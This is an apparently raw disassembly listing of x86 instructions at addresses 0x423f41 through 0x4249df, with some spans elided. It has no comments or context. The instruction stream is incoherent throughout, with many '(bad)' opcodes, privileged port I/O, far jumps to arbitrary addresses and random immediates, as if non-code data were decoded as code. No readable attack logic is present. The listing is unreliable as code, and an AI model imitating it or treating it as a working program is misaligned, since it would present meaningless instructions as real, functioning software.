  423f41:	out    dx,eax
  423f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f43:	enter  0x23ab,0xaa
  423f47:	scas   eax,DWORD PTR es:[edi]
  423f48:	add    eax,0x18c5bea1
  423f4d:	shl    DWORD PTR [ecx],cl
  423f4f:	lods   al,BYTE PTR ds:[esi]
  423f50:	mov    eax,0x4d85ec24
  423f55:	mov    cl,0x5e
  423f57:	sub    al,0xf2
  423f59:	adc    ecx,esi
  423f5b:	xchg   ch,ah
  423f5d:	xchg   ebx,eax
  423f5e:	or     eax,0xad51ea2c
  423f63:	pushf  
  423f64:	jmp    0x2a51:0x51c52f3
  423f6b:	int    0xb4
  423f6d:	sbb    eax,0x0
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	lods   al,BYTE PTR ds:[esi]
  423fe3:	sbb    DWORD PTR [edi],esi
  423fe5:	mov    ecx,0x18267
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	cwde   
  423fef:	fdiv   QWORD PTR [esi]
  423ff1:	jl     0x42406a
  423ff3:	cmp    al,0x6e
  423ff5:	pop    edi
  423ff6:	inc    ebp
  423ff7:	aaa    
  423ff8:	mov    al,0xac
  423ffa:	jp     0x423fb9
  423ffc:	sti    
  423ffd:	xchg   esi,eax
  423ffe:	loopne 0x42406c
  424000:	jne    0x42404c
  424002:	imul   eax,DWORD PTR [eax+0x218037da],0xf9a1f931
  42400c:	push   0xe89f84e5
  424011:	inc    ecx
  424012:	jno    0x42402c
  424014:	ins    DWORD PTR es:[edi],dx
  424015:	adc    al,0x21
  424017:	daa    
  424018:	imul   ebp,ecx,0x46
  42401b:	pushf  
  42401c:	dec    esp
  42401d:	out    dx,al
  42401e:	mov    ecx,0x6b1c5cd9
  424023:	mov    edi,0xaa403b27
  424028:	arpl   di,cx
  42402a:	clc    
  42402b:	fwait
  42402c:	bound  ebp,QWORD PTR [eax+0x64f0940b]
  424032:	sub    al,0x59
  424034:	bound  edx,QWORD PTR [ecx+ecx*4+0x4e1abbf2]
  42403b:	nop
  42403c:	or     DWORD PTR ds:0x6142eda9,ebx
  424042:	out    0x8,eax
  424044:	(bad)  
  424045:	cmp    al,BYTE PTR [eax]
  424047:	jl     0x42409a
  424049:	or     al,0x8a
  42404b:	lock xchg ebp,eax
  42404d:	adc    eax,0xbad93cba
  424052:	(bad)  
  424053:	in     eax,0x78
  424055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424056:	sbb    esp,edi
  424058:	sbb    eax,0x76f77b32
  42405d:	and    DWORD PTR [edi+0x37af7003],ebp
  424063:	sub    cl,dl
  424065:	mov    al,0x3b
  424067:	dec    edx
  424068:	pop    edi
  424069:	test   al,0x41
  42406b:	lock sub al,0xcc
  42406e:	bound  esp,QWORD PTR [esi+0x68115ec4]
  424074:	pop    ecx
  424075:	ja     0x424029
  424077:	fs loopne 0x4240a7
  42407a:	pop    ds
  42407b:	(bad)  
  42407c:	mov    DWORD PTR [edi-0x1],0x65651aaa
  424083:	inc    ebp
  424084:	dec    eax
  424085:	jne    0x4240a0
  424087:	fadd   DWORD PTR [edi]
  424089:	mov    esp,0xe8b12869
  42408e:	shl    BYTE PTR [edx+0x446a3baa],cl
  424094:	jge    0x424019
  424096:	adc    al,0x3
  424098:	aas    
  424099:	pop    ebp
  42409a:	ja     0x424064
  42409c:	nop
  42409d:	ss int 0xbd
  4240a0:	xchg   ebp,eax
  4240a1:	push   esp
  4240a2:	leave  
  4240a3:	or     al,0x12
  4240a5:	(bad)  
  4240a6:	shr    ebp,0xb1
  4240a9:	pushf  
  4240aa:	xor    BYTE PTR [edx-0x6bf39ccf],0x53
  4240b1:	inc    ecx
  4240b2:	push   0x74
  4240b4:	fsubr  st,st(7)
  4240b6:	mov    ebx,0xc0508e7b
  4240bb:	scas   eax,DWORD PTR es:[edi]
  4240bc:	jmp    0xd84e5fc7
  4240c1:	outs   dx,DWORD PTR ds:[esi]
  4240c2:	inc    eax
  4240c3:	pop    esp
  4240c4:	imul   BYTE PTR [edx+eiz*1+0x41913e37]
  4240cb:	jg     0x4240a1
  4240cd:	rcr    DWORD PTR [edi+ebx*4],1
  4240d0:	sub    DWORD PTR [ebx],0x8ae72536
  4240d6:	mov    cl,BYTE PTR [edi-0x45bf7209]
  4240dc:	push   edi
  4240dd:	lahf   
  4240de:	adc    esi,DWORD PTR [edi+0x2abd5fe3]
  4240e4:	dec    ecx
  4240e5:	mov    dl,0x0
  4240e7:	stos   DWORD PTR es:[edi],eax
  4240e8:	ficomp WORD PTR [edx-0x79]
  4240eb:	push   0x841d
	...
  424154:	add    BYTE PTR [eax],al
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	xchg   esp,eax
  424163:	xor    eax,0x83679d9a
  424168:	add    DWORD PTR [eax],eax
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	loope  0x4241c5
  424170:	jns    0x424171
  424172:	inc    edx
  424173:	cmp    al,0xa2
  424175:	xor    edx,DWORD PTR [ebp-0x76]
  424178:	fimul  WORD PTR [eax]
  42417a:	or     esp,DWORD PTR ds:0x983a8490
  424180:	pop    ebp
  424181:	dec    eax
  424182:	mov    esi,0x464b966b
  424187:	lock das 
  424189:	push   eax
  42418a:	lods   al,BYTE PTR ds:[esi]
  42418b:	fbstp  TBYTE PTR [edx+0x23]
  42418e:	loope  0x42413b
  424190:	popf   
  424191:	movzx  esi,BYTE PTR [esi+esi*2+0x7b]
  424196:	jb     0x424202
  424198:	inc    ebp
  424199:	push   edi
  42419a:	xlat   BYTE PTR ds:[ebx]
  42419b:	ins    BYTE PTR es:[edi],dx
  42419c:	push   edi
  42419d:	repz pop edx
  42419f:	pop    ebx
  4241a0:	sub    dl,BYTE PTR [ebx+0x692b4ab2]
  4241a6:	clc    
  4241a7:	rol    DWORD PTR ds:0x18ff654d,0x8c
  4241ae:	call   FWORD PTR fs:[ebp-0x58d09034]
  4241b5:	sub    eax,0x6e50f219
  4241ba:	icebp  
  4241bb:	call   0xfc63b1b5
  4241c0:	mov    eax,ds:0x66c18bb
  4241c5:	cmp    BYTE PTR [eax-0xa],0x9f
  4241c9:	cmp    ah,0xf9
  4241cc:	pusha  
  4241cd:	inc    ebp
  4241ce:	mov    ds:0x83974f20,eax
  4241d3:	cmp    BYTE PTR [esi-0x30938380],al
  4241d9:	pusha  
  4241da:	or     ch,al
  4241dc:	mov    dl,0x18
  4241de:	mov    esp,0x8f06d07d
  4241e3:	mov    eax,ss
  4241e5:	mov    esi,0x14daf6b1
  4241ea:	lds    ebp,FWORD PTR [edx]
  4241ec:	mov    bl,0xca
  4241ee:	es iret 
  4241f0:	jmp    0x4241c1
  4241f2:	aad    0xe0
  4241f4:	addr16 out 0x72,eax
  4241f7:	jge    0x4241a1
  4241f9:	xchg   esp,eax
  4241fa:	iret   
  4241fb:	mov    esi,0x262d488e
  424200:	cld    
  424201:	and    al,al
  424203:	mov    eax,ds:0x7c37f361
  424208:	mov    esp,0x8073a1fb
  42420d:	test   eax,0x774ae1b0
  424212:	ins    BYTE PTR es:[edi],dx
  424213:	sahf   
  424214:	mov    esi,0x29ab2e15
  424219:	test   DWORD PTR [ebx],0x5203ebf9
  42421f:	imul   esi,DWORD PTR [ebx+0x151f88f5],0xcafa6fd2
  424229:	cmp    DWORD PTR [edx+0x7577264b],esi
  42422f:	call   0x896ea104
  424234:	ins    DWORD PTR es:[edi],dx
  424235:	shl    bh,0xaa
  424238:	mov    ds:0xe597563a,eax
  42423d:	scas   al,BYTE PTR es:[edi]
  42423e:	test   al,0x1b
  424240:	lods   eax,DWORD PTR ds:[esi]
  424241:	sbb    eax,0x3af1442c
  424246:	pop    edi
  424247:	ins    DWORD PTR es:[edi],dx
  424248:	inc    esp
  424249:	mov    WORD PTR [edx+0x6414e36f],?
  42424f:	div    DWORD PTR [edi+0x1a]
  424252:	adc    esi,DWORD PTR ds:0x79597774
  424258:	pop    ebx
  424259:	or     al,0x6f
  42425b:	pop    ecx
  42425c:	das    
  42425d:	xchg   ebp,eax
  42425e:	into   
  42425f:	or     ecx,edx
  424261:	cmp    ah,BYTE PTR [eax]
  424263:	or     BYTE PTR [eax+0x7e9dcd48],ch
  424269:	xor    ah,BYTE PTR [esi]
  42426b:	mov    ebx,0xa064
	...
  4242d4:	add    BYTE PTR [eax],al
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	nop
  4242e3:	jae    0x424298
  4242e5:	jb     0x42434e
  4242e7:	test   BYTE PTR [ecx],al
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    BYTE PTR [esi],dh
  4242ef:	test   BYTE PTR [edx],0x66
  4242f2:	int    0x3e
  4242f4:	iret   
  4242f5:	adc    eax,0xf7192c
  4242fa:	js     0x42432a
  4242fc:	icebp  
  4242fd:	fs fs repz pop ss
  424301:	test   eax,0x97846c58
  424306:	leave  
  424307:	ds out 0xc7,al
  42430a:	cs pop ebp
  42430c:	es jnp 0x424367
  42430f:	lods   al,BYTE PTR es:[esi]
  424311:	test   al,0xfd
  424313:	rcr    DWORD PTR [ebx-0x28],1
  424316:	je     0x4242a1
  424318:	ret    
  424319:	cli    
  42431a:	cmp    esp,edi
  42431c:	ret    0xc256
  42431f:	inc    edi
  424320:	cmp    esp,ebx
  424322:	lea    esi,[edx-0x42]
  424325:	mov    ebp,0xba47c336
  42432a:	mov    dh,0xfa
  42432c:	xor    DWORD PTR [edx+ebx*8],edi
  42432f:	daa    
  424330:	mov    ebx,0x1025fb58
  424335:	xlat   BYTE PTR ds:[ebx]
  424336:	pop    ecx
  424337:	dec    ebp
  424338:	hlt    
  424339:	adc    eax,0xe39ec154
  42433e:	daa    
  42433f:	add    eax,0x52f9e54
  424344:	xchg   edx,eax
  424345:	mov    dh,0xc2
  424347:	mov    bl,0x49
  424349:	add    DWORD PTR [esi],esp
  42434b:	bndstx [ebx],bnd1
  42434e:	mov    ebp,0x2cb529db
  424353:	inc    esi
  424354:	cdq    
  424355:	push   edi
  424356:	cld    
  424357:	inc    ecx
  424358:	mov    DWORD PTR [edi],ebp
  42435a:	xchg   DWORD PTR [eax],ecx
  42435c:	test   al,0x30
  42435e:	aad    0xfb
  424360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424361:	dec    esp
  424362:	ror    BYTE PTR [esi-0x5c],1
  424365:	dec    eax
  424366:	mov    ebx,0xe07fc2ad
  42436b:	into   
  42436c:	fsubr  st,st(5)
  42436e:	lds    eax,FWORD PTR [esi+0x5e2de4c4]
  424374:	ins    BYTE PTR es:[edi],dx
  424375:	mov    bl,0x47
  424377:	push   edi
  424378:	cmp    edx,DWORD PTR [eax+0x7e]
  42437b:	jmp    0x424383
  42437d:	stc    
  42437e:	inc    ecx
  42437f:	dec    eax
  424380:	(bad)  
  424381:	(bad)  
  424382:	out    0xd7,al
  424384:	or     DWORD PTR [ebp-0x96cc1c1],ecx
  42438a:	inc    eax
  42438b:	sbb    dl,BYTE PTR [edi-0x2e]
  42438e:	mov    al,ds:0x1c87abe2
  424393:	cmp    eax,0xa9092b32
  424398:	jle    0x4243bc
  42439a:	sbb    bl,BYTE PTR [edx-0x12]
  42439d:	jae    0x424359
  42439f:	rcl    BYTE PTR [ecx],cl
  4243a1:	cdq    
  4243a2:	adc    DWORD PTR [ebx+0x19],eax
  4243a5:	pop    eax
  4243a6:	inc    ecx
  4243a7:	xchg   edi,eax
  4243a8:	cmp    BYTE PTR [edx+0x17],0x21
  4243ac:	rcr    DWORD PTR [ecx+0x2dcd358a],0x85
  4243b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b4:	mov    ah,0x90
  4243b6:	inc    ecx
  4243b7:	cmp    DWORD PTR [ebp-0x46],ecx
  4243ba:	push   cs
  4243bb:	(bad)  
  4243bc:	mov    cl,0x69
  4243be:	and    ecx,ebp
  4243c0:	shr    DWORD PTR [edi-0x2245bb53],cl
  4243c6:	(bad)  
  4243c7:	push   ecx
  4243c8:	test   al,0x7c
  4243ca:	jmp    0x4a87046f
  4243cf:	xor    ch,ch
  4243d1:	loopne 0x42444b
  4243d3:	push   edi
  4243d4:	sub    eax,0xa32405ee
  4243d9:	fmul   QWORD PTR [edx+0x3e39e345]
  4243df:	out    dx,al
  4243e0:	ds (bad) 
  4243e2:	push   eax
  4243e3:	xchg   BYTE PTR [ecx-0x755ddbc],bl
  4243e9:	popf   
  4243ea:	cmp    esi,ebp
  4243ec:	aad    0xbb
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x4243f8
  424463:	push   ecx
  424464:	clc    
  424465:	and    DWORD PTR [edi-0x7b],0x1
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    ch,al
  42446f:	mov    dl,0xa7
  424471:	stos   BYTE PTR es:[edi],al
  424472:	mov    dl,0xc6
  424474:	rcl    DWORD PTR [ecx+0x3b],cl
  424477:	xchg   esp,eax
  424478:	jle    0x424492
  42447a:	jbe    0x4244a1
  42447c:	outs   dx,BYTE PTR ds:[esi]
  42447d:	fwait
  42447e:	xchg   esp,eax
  42447f:	xor    esp,edi
  424481:	stos   BYTE PTR es:[edi],al
  424482:	xchg   esi,eax
  424483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424484:	dec    eax
  424485:	xchg   edi,eax
  424486:	jl     0x42440f
  424488:	(bad)  
  424489:	adc    esp,esi
  42448b:	sahf   
  42448c:	pop    esi
  42448d:	push   0xb585abf5
  424492:	mov    ebx,0x846a4f60
  424497:	ret    
  424498:	popa   
  424499:	je     0x424508
  42449b:	pushf  
  42449c:	into   
  42449d:	repz std 
  42449f:	out    0x19,al
  4244a1:	xchg   ebx,eax
  4244a2:	push   eax
  4244a3:	cld    
  4244a4:	mov    bh,0x74
  4244a6:	lods   eax,DWORD PTR ds:[esi]
  4244a7:	inc    eax
  4244a8:	xor    bl,BYTE PTR [ecx+0x46]
  4244ab:	and    BYTE PTR ds:0x3c47421f,dl
  4244b1:	mov    esi,esi
  4244b3:	mov    cl,BYTE PTR [ebx-0x6afa5f20]
  4244b9:	call   0xb558068d
  4244be:	fwait
  4244bf:	mov    DWORD PTR [edx],ecx
  4244c1:	inc    edx
  4244c2:	cdq    
  4244c3:	dec    edi
  4244c4:	cmp    ebp,edx
  4244c6:	sti    
  4244c7:	dec    esp
  4244c8:	outs   dx,DWORD PTR ds:[esi]
  4244c9:	xor    eax,DWORD PTR [esi+0x5b1978c9]
  4244cf:	pmulhw mm0,mm7
  4244d2:	add    edx,DWORD PTR [ebp+0x4a4c54e8]
  4244d8:	add    BYTE PTR [edx],dh
  4244da:	or     ebx,DWORD PTR [ebx+0x4882254d]
  4244e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244e2:	jmp    0xd268789f
  4244e7:	in     eax,0x62
  4244e9:	repz imul edx,ebp,0x48
  4244ed:	adc    edx,DWORD PTR [ecx-0x6ecd5d5d]
  4244f3:	inc    esi
  4244f4:	xchg   DWORD PTR [edi-0x14],edx
  4244f7:	fld    QWORD PTR [ebx+0x2]
  4244fa:	cmc    
  4244fb:	cmp    al,0xb8
  4244fd:	scas   eax,DWORD PTR es:[edi]
  4244fe:	mov    ah,0x47
  424500:	ins    BYTE PTR es:[edi],dx
  424501:	sub    eax,0xc13be0ff
  424506:	retf   
  424507:	shr    dl,0x72
  42450a:	or     edx,ebx
  42450c:	mov    ebp,esp
  42450e:	loope  0x4244ce
  424510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424511:	push   ss
  424512:	mov    ecx,0xd3ac4e94
  424517:	jbe    0x424519
  424519:	out    dx,al
  42451a:	out    dx,al
  42451b:	pop    esi
  42451c:	xchg   esi,eax
  42451d:	lahf   
  42451e:	jecxz  0x424577
  424520:	test   al,0x4b
  424522:	push   ebx
  424523:	fdivr  QWORD PTR [ecx-0x6266a09a]
  424529:	and    eax,edx
  42452b:	cdq    
  42452c:	cmp    eax,0x3643d2ad
  424531:	sti    
  424532:	mov    ds:0x9dfd22b0,eax
  424537:	dec    esi
  424538:	fdiv   DWORD PTR [esi+0x383b88d7]
  42453e:	push   ecx
  42453f:	(bad)  
  424540:	adc    dh,cl
  424542:	xchg   DWORD PTR ss:[edi+0x6c],edx
  424546:	shl    dh,0x79
  424549:	pop    esp
  42454a:	mov    al,ds:0x215416d8
  42454f:	or     al,0xe7
  424551:	stos   DWORD PTR es:[edi],eax
  424552:	dec    edx
  424553:	add    DWORD PTR [ecx-0x66],0x38a16c5a
  42455a:	lahf   
  42455b:	inc    esi
  42455c:	jae    0x424540
  42455e:	xchg   ebx,eax
  42455f:	mov    edx,0x1385cb64
  424564:	push   0x9451f78e
  424569:	sbb    BYTE PTR [ebx+0xa59da8],bl
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x43],1
  4245e3:	test   eax,0x8667eac8
  4245e8:	add    DWORD PTR [eax],eax
  4245ea:	add    BYTE PTR [ecx],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	int    0x26
  4245f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245f1:	xchg   bx,ax
  4245f3:	test   ah,cl
  4245f5:	cs pop edx
  4245f7:	sbb    ch,ch
  4245f9:	mov    ecx,0x745acd32
  4245fe:	stos   DWORD PTR es:[edi],eax
  4245ff:	adc    ah,ch
  424601:	mov    ah,0xd6
  424603:	mov    ebp,0xb804fa19
  424608:	ds rol bh,0xba
  42460c:	xchg   edi,eax
  42460d:	jp     0x4245fc
  42460f:	fnstsw WORD PTR [ebx+0x10ef548]
  424615:	rcr    DWORD PTR [ecx+0x5ff01cbd],cl
  42461b:	lea    edi,[ecx-0x7d684cbc]
  424621:	fist   DWORD PTR [esp+edx*4-0x252d4970]
  424628:	add    DWORD PTR [edi+0x44],edi
  42462b:	sub    al,0xd1
  42462d:	pop    eax
  42462e:	stc    
  42462f:	out    0x3,eax
  424631:	mov    dl,0x1c
  424633:	(bad)  
  424634:	mov    al,ds:0x20ea733c
  424639:	dec    esp
  42463a:	imul   BYTE PTR [eax]
  42463c:	sahf   
  42463d:	add    eax,0x2c82e9ae
  424642:	sahf   
  424643:	fcom   QWORD PTR [ebx]
  424645:	jnp    0x4246bf
  424647:	dec    ecx
  424648:	mov    edx,ebp
  42464a:	add    ch,bl
  42464c:	pop    ebx
  42464d:	jecxz  0x4246b6
  42464f:	aaa    
  424650:	jbe    0x4246d0
  424652:	int    0xd8
  424654:	xchg   ebx,eax
  424655:	inc    edi
  424656:	xchg   edi,eax
  424657:	sub    cl,BYTE PTR [esi-0x79]
  42465a:	shl    DWORD PTR [edx-0x6c4a1e92],1
  424660:	or     BYTE PTR [ebp-0x3],bl
  424663:	popa   
  424664:	sbb    edx,DWORD PTR [eax-0x52a787f3]
  42466a:	loop   0x42460c
  42466c:	frstor [ebx]
  42466e:	out    0xe7,eax
  424670:	cmc    
  424671:	pop    esi
  424672:	pop    ss
  424673:	add    esp,DWORD PTR [edi+0x6415afa2]
  424679:	sahf   
  42467a:	rcl    BYTE PTR [eax-0x30a5fc37],1
  424680:	xchg   edi,eax
  424681:	in     al,0x97
  424683:	mov    al,ds:0x3354fde0
  424688:	mov    ds:0x439f5474,eax
  42468d:	mov    esi,0x85a53d0d
  424692:	in     al,0xf8
  424694:	mov    esi,0x9c44ae91
  424699:	in     eax,dx
  42469a:	nop
  42469b:	adc    DWORD PTR [esi],ebp
  42469d:	scas   al,BYTE PTR es:[edi]
  42469e:	dec    ebx
  42469f:	test   eax,0xad203dc0
  4246a4:	clc    
  4246a5:	pop    ss
  4246a6:	push   ss
  4246a7:	imul   ecx,esi,0xf5f887c5
  4246ad:	jne    0x4246b6
  4246af:	add    BYTE PTR ds:0x5f946179,bh
  4246b5:	mov    WORD PTR [edx+0x178a2656],cs
  4246bb:	ret    0x2e95
  4246be:	data16 and BYTE PTR [ebp-0x3b],ch
  4246c2:	dec    ecx
  4246c3:	call   0xf05f5027
  4246c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c9:	mov    dl,0xc3
  4246cb:	sahf   
  4246cc:	push   0x47
  4246ce:	sub    eax,0xfe800fdb
  4246d3:	cmp    DWORD PTR [esi+0x45309964],esi
  4246d9:	push   esi
  4246da:	fwait
  4246db:	jmp    0x8d1d162e
  4246e0:	inc    eax
  4246e1:	mov    dl,0x25
  4246e3:	xchg   ecx,eax
  4246e4:	add    dl,dl
  4246e6:	cmp    edi,edi
  4246e8:	sbb    eax,0x77dc3718
  4246ed:	out    dx,al
	...
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [eax-0x39],dl
  424764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424765:	dec    esi
  424766:	xchg   DWORD PTR [bx+di],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [ebp-0x33],dh
  424770:	ds jmp 0x4247ee
  424773:	into   
  424774:	test   eax,0xaa7ed1c0
  424779:	rcl    BYTE PTR [bp+di+0x6f],1
  42477d:	or     DWORD PTR [esi+0x513c6969],ebp
  424783:	adc    BYTE PTR [ebp-0x48ed775d],bl
  424789:	sbb    eax,0xac7ee5c
  42478e:	xchg   BYTE PTR [esi+0x29],cl
  424791:	ret    0xf796
  424794:	call   0xfc5cb5dd
  424799:	and    DWORD PTR ds:[ebp+0x70e2d5d9],edi
  4247a0:	mov    esi,0x38b7a544
  4247a5:	pop    ecx
  4247a6:	adc    ch,BYTE PTR [ecx]
  4247a8:	(bad)  
  4247a9:	in     al,0x23
  4247ab:	pop    es
  4247ac:	sub    ch,dl
  4247ae:	enter  0x4042,0x84
  4247b2:	sub    eax,0x2bcb3e5f
  4247b7:	fimul  DWORD PTR [ebp+0x42107d2f]
  4247bd:	(bad)  
  4247be:	rcr    BYTE PTR [ecx-0x795e6023],cl
  4247c4:	inc    esi
  4247c5:	mov    ds:0xbcc69c64,al
  4247ca:	mov    ebp,0x4dd92c11
  4247cf:	inc    edx
  4247d0:	add    DWORD PTR [ebx+0x1d30c893],edx
  4247d6:	inc    ebp
  4247d7:	mov    edi,DWORD PTR [ecx+0x63b4b1b3]
  4247dd:	int    0x49
  4247df:	das    
  4247e0:	popa   
  4247e1:	jno    0x4247e9
  4247e3:	fimul  WORD PTR [ecx]
  4247e5:	test   BYTE PTR [edi-0x4d329de7],ah
  4247eb:	sbb    al,0x1c
  4247ed:	mov    dh,al
  4247ef:	cmp    eax,0x4b0329a7
  4247f4:	shr    ah,cl
  4247f6:	xchg   BYTE PTR ss:[edx-0x2f47456e],dl
  4247fd:	mov    edi,0x2db0145
  424802:	jge    0x424859
  424804:	repnz cdq 
  424806:	rcl    DWORD PTR [ebx-0x79],cl
  424809:	outs   dx,BYTE PTR ds:[esi]
  42480a:	les    esi,FWORD PTR [eax+0x8b9b87e]
  424810:	outs   dx,BYTE PTR ds:[esi]
  424811:	scas   al,BYTE PTR es:[edi]
  424812:	scas   eax,DWORD PTR es:[edi]
  424813:	mov    ecx,0xcfbbe1a9
  424818:	inc    ecx
  424819:	mov    WORD PTR [esi+0x48a08579],ds
  42481f:	jle    0x42489a
  424821:	repnz sub edx,DWORD PTR [edi+0x2b]
  424825:	xchg   ebx,eax
  424826:	jnp    0x42485f
  424828:	fbstp  TBYTE PTR [edi+0x55]
  42482b:	jae    0x4247d6
  42482d:	push   edx
  42482e:	sub    al,0x9b
  424830:	int3   
  424831:	pop    edx
  424832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424833:	pusha  
  424834:	jmp    DWORD PTR [edi*1-0x63e29ce3]
  42483b:	mov    ds:0xf9319317,eax
  424840:	jmp    0x68cfd9c8
  424845:	or     al,0xef
  424847:	and    al,0xbe
  424849:	mov    bl,BYTE PTR [ebx+0x28]
  42484c:	pop    ecx
  42484d:	adc    esp,DWORD PTR [ecx]
  42484f:	mov    al,ds:0xa8b264f3
  424854:	mov    edi,0xea1e8a1e
  424859:	xchg   ecx,eax
  42485a:	mov    edi,0x78aef061
  42485f:	retf   0x86a
  424862:	jae    0x424874
  424864:	fs push ebx
  424866:	scas   al,BYTE PTR es:[edi]
  424867:	push   es
  424868:	test   eax,0x1fcc6711
  42486d:	fld    QWORD PTR [eax]
	...
  4248d3:	add    BYTE PTR [eax],al
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	out    dx,eax
  4248e3:	cmp    eax,0x88676da0
  4248e8:	add    DWORD PTR [eax],eax
  4248ea:	add    BYTE PTR [ecx],al
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	fadd   QWORD PTR [ecx]
  4248f0:	xlat   BYTE PTR ds:[ebx]
  4248f1:	mov    cs,WORD PTR [esi+esi*8]
  4248f4:	or     BYTE PTR [eax],ah
  4248f6:	outs   dx,BYTE PTR ds:[esi]
  4248f7:	div    BYTE PTR [edi+0x24]
  4248fa:	aad    0xa4
  4248fc:	sbb    DWORD PTR [edi-0x6e7398e3],eax
  424902:	or     bh,ah
  424904:	add    ah,BYTE PTR [esi]
  424906:	sti    
  424907:	push   esp
  424908:	bound  esp,QWORD PTR [ebx+0x4a50a28a]
  42490e:	add    eax,0x73ac3bbd
  424913:	in     al,0x94
  424915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424916:	into   
  424917:	add    al,0x37
  424919:	mov    ah,0x4c
  42491b:	rcr    DWORD PTR [edx+0x6b65ecb2],1
  424921:	dec    edi
  424922:	mov    edi,0x89ec3dbf
  424927:	jne    0x424942
  424929:	ror    cl,1
  42492b:	fst    st(6)
  42492d:	test   bh,ah
  42492f:	test   eax,0xa9350221
  424934:	retf   
  424935:	and    eax,0x65869f3e
  42493a:	jns    0x424921
  42493c:	push   esi
  42493d:	inc    ebp
  42493e:	and    al,0xfb
  424940:	ret    0x95cb
  424943:	loop   0x4249a6
  424945:	mov    BYTE PTR [ecx],bh
  424947:	loop   0x4248e7
  424949:	pop    ebx
  42494a:	jmp    0xbad37c06
  42494f:	cmp    BYTE PTR [edi+0x75],0x72
  424953:	push   ds
  424954:	pop    ecx
  424955:	sub    DWORD PTR [edi+0x16],ebp
  424958:	ins    DWORD PTR es:[edi],dx
  424959:	xchg   esi,eax
  42495a:	enter  0x28c6,0xa9
  42495e:	aaa    
  42495f:	push   ebp
  424960:	pop    ds
  424961:	sub    BYTE PTR [esi+0x5d],dh
  424964:	sub    dh,BYTE PTR [ebx]
  424966:	lahf   
  424967:	cmp    BYTE PTR [edx],bh
  424969:	mov    WORD PTR [eax+0x15d0d394],fs
  42496f:	mov    ecx,DWORD PTR [eax+0x18b0c4a6]
  424975:	inc    esp
  424976:	repz pop ebx
  424978:	lahf   
  424979:	repz out 0x6f,eax
  42497c:	sbb    edi,ebx
  42497e:	rcl    BYTE PTR [edx+0x4a43e198],1
  424984:	dec    esi
  424985:	pop    ds
  424986:	retf   0xd4f1
  424989:	push   esp
  42498a:	call   FWORD PTR [eax+0x2e]
  42498d:	std    
  42498e:	xchg   ebp,eax
  42498f:	and    ebx,ebp
  424991:	les    ecx,FWORD PTR [eax+0x67fda693]
  424997:	sar    DWORD PTR [ebx+edi*1-0x4e],cl
  42499b:	mov    DWORD PTR [edi+0x54],ebx
  42499e:	cld    
  42499f:	fsub   DWORD PTR [edi-0x5ab0bb88]
  4249a5:	jne    0x424a02
  4249a7:	adc    ecx,ecx
  4249a9:	xchg   edi,eax
  4249aa:	and    al,0x66
  4249ac:	or     cl,BYTE PTR [esi]
  4249ae:	fs dec esi
  4249b0:	sub    esi,ecx
  4249b2:	inc    ebp
  4249b3:	mov    ebp,0xa4a9587f
  4249b8:	add    BYTE PTR [ebp+edi*1-0x40],al
  4249bc:	adc    DWORD PTR [eax+0x12],edi
  4249bf:	outs   dx,BYTE PTR ds:[esi]
  4249c0:	js     0x42497c
  4249c2:	push   esp
  4249c3:	sbb    esp,ebp
  4249c5:	inc    esi
  4249c6:	mov    bl,0xba
  4249c8:	cs pushf 
  4249ca:	hlt    
  4249cb:	ror    dh,1
  4249cd:	cdq    
  4249ce:	arpl   WORD PTR [esi],ax
  4249d0:	sbb    DWORD PTR [edi-0x7],edi
  4249d3:	dec    ebx
  4249d4:	imul   ebx,DWORD PTR [ecx],0x2bac770c
  4249da:	jl     0x4249ec
  4249dc:	xlat   BYTE PTR ds:[ebx]
  4249dd:	in     eax,0x79
  4249df:	mov    ?,WORD PTR [ebp+0x2813b09]
